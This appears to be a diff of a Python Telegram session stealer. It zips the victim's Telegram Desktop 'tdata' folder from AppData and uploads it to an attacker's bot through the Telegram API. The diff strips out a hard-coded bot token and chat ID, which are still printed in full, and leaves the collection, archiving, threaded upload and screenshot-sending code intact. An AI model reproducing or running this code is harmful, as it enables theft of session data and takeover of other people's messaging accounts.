@@ -1,8 +1,3 @@
-token = '7056495787:AAHkVcBQcjIMBtfoDcSCXhc8MfYQQ9MUzw8'
-bot = telebot.TeleBot(token)
-chat_id = 1882056354
-telegram_bot_token = "7056495787:AAHkVcBQcjIMBtfoDcSCXhc8MfYQQ9MUzw8"
-chat_ids = ('1882056354')
 
 def send_message_to_group(chat_id):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
@@ -31,6 +26,7 @@ def create_zip_archive(source_dir, output_zip):
         time.sleep(10)
         print(f"Error creating zip archive: {str(e)}")
         return None
+    pass
 
 def send_file_to_telegram(file_path, file_name):
     url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
@@ -40,6 +36,8 @@ def send_file_to_telegram(file_path, file_name):
     if response.status_code != 200:
         print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
         print(response.text)
+    pass
+
 def archive_and_send():
     if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
         try:
@@ -48,7 +46,6 @@ def archive_and_send():
             if not os.path.exists(temp_dir):
                 os.makedirs(temp_dir)  # Создаем папку, если её нет
             output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
-
             created_zip = create_zip_archive(source_dir, output_zip)
             if created_zip:
                 send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
@@ -56,6 +53,7 @@ def archive_and_send():
                 print("Failed to create or send zip file.")
         except Exception as e:
             print(f"Error creating or sending zip file: {str(e)}")
+
 thread = threading.Thread(target=archive_and_send)
 thread.start()
 time.sleep(20)
